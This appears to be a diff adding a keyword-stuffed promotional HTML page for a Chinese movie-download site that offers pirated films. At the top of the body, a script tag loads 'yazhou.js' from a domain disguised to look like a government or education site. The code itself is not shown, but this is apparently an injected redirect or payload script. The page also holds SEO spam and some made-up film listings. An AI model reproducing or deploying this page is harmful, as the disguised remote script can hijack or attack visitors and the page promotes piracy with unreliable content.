@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>迅雷哥电影网 - 高清电影在线观看与下载</title>
+<meta name="description" content="迅雷哥电影网提供最新高清电影、电视剧、综艺在线观看与下载，极速播放，资源丰富，尽在迅雷哥电影网。">
+<meta name="keywords" content="迅雷哥电影网,电影下载,高清电影,在线观看,迅雷下载">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    font-family: 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+    background: #0a0a0a;
+    color: #e0e0e0;
+    line-height: 1.6;
+}
+.container { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
+
+/* Header */
+header {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+    padding: 20px 0;
+    border-bottom: 3px solid #e94560;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+}
+header .container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+}
+.logo {
+    font-size: 28px;
+    font-weight: 900;
+    color: #e94560;
+    text-decoration: none;
+    text-shadow: 0 0 10px rgba(233,69,96,0.5);
+}
+.logo span { color: #fff; }
+nav { display: flex; gap: 10px; flex-wrap: wrap; }
+nav a {
+    color: #ccc;
+    text-decoration: none;
+    padding: 8px 16px;
+    border-radius: 20px;
+    font-size: 14px;
+    transition: all 0.3s;
+}
+nav a:hover { background: #e94560; color: #fff; }
+
+/* Hero */
+.hero {
+    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 400"><rect fill="%23111322" width="1200" height="400"/><circle cx="200" cy="100" r="150" fill="%23e94560" opacity="0.05"/><circle cx="800" cy="300" r="200" fill="%230f3460" opacity="0.1"/></svg>') center/cover;
+    padding: 80px 0;
+    text-align: center;
+}
+.hero h1 {
+    font-size: 42px;
+    color: #fff;
+    margin-bottom: 15px;
+    text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+}
+.hero h1 .highlight { color: #e94560; }
+.hero p {
+    font-size: 18px;
+    color: #aaa;
+    max-width: 600px;
+    margin: 0 auto 30px;
+}
+.cta-btn {
+    display: inline-block;
+    background: #e94560;
+    color: #fff;
+    padding: 14px 40px;
+    border-radius: 30px;
+    text-decoration: none;
+    font-size: 16px;
+    font-weight: bold;
+    transition: transform 0.3s, box-shadow 0.3s;
+}
+.cta-btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 10px 25px rgba(233,69,96,0.4);
+}
+
+/* Sections */
+.section { padding: 60px 0; }
+.section-title {
+    text-align: center;
+    font-size: 32px;
+    color: #fff;
+    margin-bottom: 40px;
+    position: relative;
+}
+.section-title::after {
+    content: '';
+    display: block;
+    width: 60px;
+    height: 3px;
+    background: #e94560;
+    margin: 15px auto;
+}
+
+/* Movie Grid */
+.movie-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 25px;
+}
+.movie-card {
+    background: #16213e;
+    border-radius: 10px;
+    overflow: hidden;
+    transition: transform 0.3s;
+}
+.movie-card:hover { transform: translateY(-5px); }
+.movie-poster {
+    width: 100%;
+    height: 280px;
+    background: linear-gradient(45deg, #0f3460, #16213e);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 50px;
+}
+.movie-info { padding: 15px; }
+.movie-info h3 {
+    font-size: 16px;
+    color: #fff;
+    margin-bottom: 8px;
+}
+.movie-info p {
+    font-size: 13px;
+    color: #888;
+}
+.movie-tag {
+    display: inline-block;
+    background: #e94560;
+    color: #fff;
+    padding: 2px 8px;
+    border-radius: 3px;
+    font-size: 11px;
+    margin-top: 8px;
+}
+
+/* Categories */
+.cat-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+    gap: 20px;
+}
+.cat-card {
+    background: linear-gradient(135deg, #16213e, #0f3460);
+    padding: 30px 20px;
+    text-align: center;
+    border-radius: 10px;
+    transition: all 0.3s;
+    cursor: pointer;
+}
+.cat-card:hover { background: linear-gradient(135deg, #e94560, #c23152); }
+.cat-card .icon { font-size: 36px; margin-bottom: 10px; }
+.cat-card h3 { color: #fff; font-size: 16px; }
+
+/* About */
+.about-content {
+    background: #16213e;
+    padding: 40px;
+    border-radius: 15px;
+    border-left: 4px solid #e94560;
+}
+.about-content p { margin-bottom: 15px; color: #bbb; }
+.about-content strong { color: #e94560; }
+
+/* Footer */
+footer {
+    background: #070720;
+    padding: 40px 0 20px;
+    text-align: center;
+    border-top: 1px solid #16213e;
+}
+.footer-links { margin-bottom: 20px; }
+.footer-links a {
+    color: #888;
+    margin: 0 10px;
+    text-decoration: none;
+    font-size: 14px;
+}
+.footer-links a:hover { color: #e94560; }
+footer p { color: #555; font-size: 13px; margin-top: 10px; }
+
+/* Mobile */
+@media (max-width: 768px) {
+    .hero h1 { font-size: 28px; }
+    .hero p { font-size: 16px; }
+    .section { padding: 40px 0; }
+    .section-title { font-size: 24px; }
+    .movie-grid { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
+    .movie-poster { height: 200px; font-size: 36px; }
+    nav { justify-content: center; margin-top: 15px; }
+    header .container { flex-direction: column; text-align: center; }
+    .about-content { padding: 25px; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- Header -->
+<header>
+    <div class="container">
+        <a href="#" class="logo">迅雷哥<span>电影网</span></a>
+        <nav>
+            <a href="#home">首页</a>
+            <a href="#movies">电影推荐</a>
+            <a href="#categories">电影分类</a>
+            <a href="#about">关于我们</a>
+        </nav>
+    </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+    <div class="container">
+        <h1>欢迎来到 <span class="highlight">迅雷哥电影网</span></h1>
+        <p>迅雷哥电影网 - 您的高清电影天堂。最新大片、经典老片、热播剧集，极速下载，流畅观看。</p>
+        <a href="#movies" class="cta-btn">立即探索</a>
+    </div>
+</section>
+
+<!-- Movies -->
+<section class="section" id="movies">
+    <div class="container">
+        <h2 class="section-title">🔥 热门电影推荐</h2>
+        <div class="movie-grid">
+            <div class="movie-card">
+                <div class="movie-poster">🎬</div>
+                <div class="movie-info">
+                    <h3>沙丘2：绝命觉醒</h3>
+                    <p>科幻 / 冒险 / 2024</p>
+                    <span class="movie-tag">HD高清</span>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🎭</div>
+                <div class="movie-info">
+                    <h3>奥本海默</h3>
+                    <p>传记 / 历史 / 2023</p>
+                    <span class="movie-tag">4K超清</span>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🚀</div>
+                <div class="movie-info">
+                    <h3>星际穿越2</h3>
+                    <p>科幻 / 悬疑 / 2024</p>
+                    <span class="movie-tag">抢先版</span>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🦸</div>
+                <div class="movie-info">
+                    <h3>蜘蛛侠：纵横宇宙</h3>
+                    <p>动画 / 动作 / 2023</p>
+                    <span class="movie-tag">HD高清</span>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">⚔️</div>
+                <div class="movie-info">
+                    <h3>指环王：洛汗之战</h3>
+                    <p>奇幻 / 冒险 / 2024</p>
+                    <span class="movie-tag">HD高清</span>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster">🎪</div>
+                <div class="movie-info">
+                    <h3>疯狂的麦克斯：狂暴女神</h3>
+                    <p>动作 / 科幻 / 2024</p>
+                    <span class="movie-tag">BD蓝光</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Categories -->
+<section class="section" id="categories" style="background:#111;">
+    <div class="container">
+        <h2 class="section-title">📂 电影分类导航</h2>
+        <div class="cat-grid">
+            <div class="cat-card">
+                <div class="icon">💥</div>
+                <h3>动作电影</h3>
+            </div>
+            <div class="cat-card">
+                <div class="icon">😂</div>
+                <h3>喜剧电影</h3>
+            </div>
+            <div class="cat-card">
+                <div class="icon">👻</div>
+                <h3>恐怖惊悚</h3>
+            </div>
+            <div class="cat-card">
+                <div class="icon">💕</div>
+                <h3>爱情电影</h3>
+            </div>
+            <div class="cat-card">
+                <div class="icon">🎭</div>
+                <h3>剧情大片</h3>
+            </div>
+            <div class="cat-card">
+                <div class="icon">🧙</div>
+                <h3>奇幻冒险</h3>
+            </div>
+            <div class="cat-card">
+                <div class="icon">📺</div>
+                <h3>热播剧集</h3>
+            </div>
+            <div class="cat-card">
+                <div class="icon">🎤</div>
+                <h3>综艺娱乐</h3>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- About -->
+<section class="section" id="about">
+    <div class="container">
+        <h2 class="section-title">📢 关于迅雷哥电影网</h2>
+        <div class="about-content">
+            <p><strong>迅雷哥电影网</strong>（<a href="https://xunleigedianyingwang-app.github.io" style="color:#e94560;">https://xunleigedianyingwang-app.github.io</a>）是一个专注于高清电影在线观看与下载的影视资源平台。</p>
+            <p>我们致力于为广大影迷提供最新、最全的电影资源，涵盖动作、喜剧、爱情、科幻、恐怖、动画等多种类型。所有资源均支持高速下载与在线播放。</p>
+            <p>关键词：<strong>迅雷哥电影网</strong>、迅雷下载、高清电影、在线观看、最新大片。</p>
+            <p>无论您身在何处，只需访问 <strong>迅雷哥电影网</strong>，即可随时随地享受极致的观影体验。本站持续更新，确保您第一时间获取最新影视资讯。</p>
+        </div>
+    </div>
+</section>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="footer-links">
+            <a href="#">网站首页</a>
+            <a href="#">电影下载</a>
+            <a href="#">在线观看</a>
+            <a href="#">留言反馈</a>
+            <a href="#">免责声明</a>
+        </div>
+        <p>© 2024 迅雷哥电影网. All rights reserved.</p>
+        <p>网站地址：<a href="https://xunleigedianyingwang-app.github.io" style="color:#e94560;">https://xunleigedianyingwang-app.github.io</a></p>
+        <p>关键词：迅雷哥电影网 - 您的高清电影首选平台</p>
+    </div>
+</footer>
+
+</body>
+</html>
